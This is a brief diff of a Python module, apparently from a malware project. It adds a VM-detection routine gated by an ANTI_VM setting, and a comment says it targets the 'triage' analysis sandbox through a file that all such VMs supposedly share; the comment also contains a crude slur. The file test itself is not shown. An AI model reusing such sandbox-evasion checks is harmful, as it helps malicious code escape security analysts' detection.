@@ -1,7 +1,6 @@
 import os
 from co.config import ANTI_VM  
 VM = False
-
 def check_vm_files():
     global VM
     if ANTI_VM:
@@ -9,6 +8,5 @@ def check_vm_files():
             VM = True
     else:
         VM = False
-
 check_vm_files()
 #triage is pretty retaded cuz all traige vms have this one exact file
